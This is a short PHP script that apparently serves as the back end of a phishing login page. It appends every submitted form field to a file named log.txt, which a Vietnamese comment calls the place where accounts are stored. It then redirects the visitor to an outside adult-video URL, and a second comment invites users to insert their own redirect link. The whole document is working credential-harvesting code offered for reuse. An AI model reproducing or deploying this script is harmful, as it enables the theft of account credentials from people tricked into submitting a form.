<?php
header("Location: http://vlxx.cc/video/cap-mong-tuyet-dep-cua-co-con-rieng-me-ke/1542/ "); //nhập link các bạn muốn chuyển đến 
$handle = fopen("log.txt", "a");//nơi lưu tài khoản
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>